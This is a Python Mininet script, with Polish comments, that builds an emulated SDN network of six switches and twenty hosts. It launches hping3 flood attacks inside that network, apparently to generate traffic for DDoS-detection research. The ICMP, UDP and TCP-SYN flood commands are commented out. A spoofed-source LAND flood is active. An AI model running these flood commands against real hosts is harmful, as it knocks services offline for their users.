from mininet.topo import Topo
from mininet.net import Mininet
from mininet.link import TCLink
from mininet.log import setLogLevel
from mininet.cli import CLI
from mininet.node import OVSKernelSwitch, RemoteController
import time
import random
from datetime import datetime

class MyTopo (Topo):
    def build(self):

        s1 = self.addSwitch('s1', cls=OVSKernelSwitch, protocols='OpenFlow13')
        s2 = self.addSwitch('s2', cls=OVSKernelSwitch, protocols='OpenFlow13')
        s3 = self.addSwitch('s3', cls=OVSKernelSwitch, protocols='OpenFlow13')
        s4 = self.addSwitch('s4', cls=OVSKernelSwitch, protocols='OpenFlow13')
        s5 = self.addSwitch('s5', cls=OVSKernelSwitch, protocols='OpenFlow13')
        s6 = self.addSwitch('s6', cls=OVSKernelSwitch, protocols='OpenFlow13')

        hosts = []
        for i in range(1, 21):
            h = self.addHost(
                f'h{i}',
                mac=f'00:00:00:00:00:{i:02d}',
                ip=f'10.0.0.{i}/24'
            )
            hosts.append(h)


        self.addLink(hosts[0],s1)
        self.addLink(hosts[1],s1)
        self.addLink(hosts[2],s1)
        self.addLink(hosts[3],s1)

        self.addLink(hosts[4],s2)
        self.addLink(hosts[5],s2)
        self.addLink(hosts[6],s2)

        self.addLink(hosts[7],s3)

        self.addLink(hosts[8],s4)
        self.addLink(hosts[9],s4)
        self.addLink(hosts[10],s4)

        self.addLink(hosts[11],s5)
        self.addLink(hosts[12],s5)
        self.addLink(hosts[13],s5)

        self.addLink(hosts[14],s6)
        self.addLink(hosts[15],s6)
        self.addLink(hosts[16],s6)
        self.addLink(hosts[17],s6)

        self.addLink(s1,s2)
        self.addLink(s2,s3)
        self.addLink(s3,s4)
        self.addLink(s3,s5)
        self.addLink(s5,s6)

        self.addLink(hosts[18], s5)
        self.addLink(hosts[19], s1)


def start_network():
    topo = MyTopo()
    c0 = RemoteController('c0', ip='127.0.0.1', port=6653)
    net = Mininet(topo=topo, controller=c0, link=TCLink)

    net.start()

    hosts = [net.get(f'h{i}') for i in range(1, 21)]
    h8 = net.get('h8')  # host z serwerem HTTP i iperf

    print("Starting services on h8 and preparing to perform TCP-SYN flood...")

    WEB_DIR = '/home/tymek/Desktop/project/mininet_web'
    HTTP_PORT = 8080

    # start prostego serwera HTTP
    h8.cmd(f'python3 -m http.server {HTTP_PORT} --directory {WEB_DIR} &')
    time.sleep(2)

    TARGET_IP = hosts[7].IP()  # IP h8

    # # Generowanie ataku ICMP-flood
    # src = random.choice(hosts)
    # dst = random.choice([h for h in hosts if h != src])
    # dst_ip = dst.IP()
    # print(f" ICMP Flood: src={src.name}({src.IP()}) -> {dst_ip}, ")  
    # print("--------------------------------------------------------------------------------")
    # print("Performing ICMP (Ping) Flood")  
    # print("--------------------------------------------------------------------------------")   
    # cmd = f"timeout 20s hping3 -1 -V -d  120 --flood {dst_ip}"
    # src.cmd(cmd) 
    # #time.sleep(100)

    # # Generowanie ataku UDP-flood
    # src = random.choice(hosts)
    # dst = random.choice([h for h in hosts if h != src])
    # dst_ip = dst.IP()
    # print(f" UDP Flood: src={src.name}({src.IP()}) -> {dst_ip}, ")  
    # print("--------------------------------------------------------------------------------")
    # print("Performing UDP Flood")  
    # print("--------------------------------------------------------------------------------")   
    # cmd = f"timeout 20s hping3 -2 -V -d 120 --flood {dst_ip}"
    # src.cmd(cmd)    
    # #time.sleep(100)

    # # Generowanie ataku TCP-SYN-flood
    # src = random.choice(hosts)
    # dst_ip = '10.0.0.8'
    # print(f" TCP-SYN Flood: src={src.name}({src.IP()}) -> {dst_ip}, ")
    # print("--------------------------------------------------------------------------------")
    # print("Performing TCP-SYN Flood")  
    # print("--------------------------------------------------------------------------------")
    # cmd = cmd = f"timeout 20s hping3 -S -V -d 120 -w 64 -p 8080 --flood {dst_ip}"
    # src.cmd(cmd)
    # # time.sleep(100)

    # Generowanie ataku LAND
    src = random.choice(hosts)
    dst = random.choice([h for h in hosts if h != src])
    dst_ip = dst.IP()
    print(f" LAND attack: src={src.name}({src.IP()}) -> {dst_ip}, ")
    print("--------------------------------------------------------------------------------")
    print("Performing LAND Attack")  
    print("--------------------------------------------------------------------------------")   
    cmd = f"timeout 20s hping3 -1 -V -d 120 --flood -a {dst_ip} {dst_ip}"
    src.cmd(cmd)
    #time.sleep(100)  

    CLI(net)
    net.stop()

if __name__ == '__main__':   
    setLogLevel('info')

    start = datetime.now()

    start_network()

    end = datetime.now()
    print("Start time: ", start)
    print("End time: ", end)
    print("Duration: ", end - start)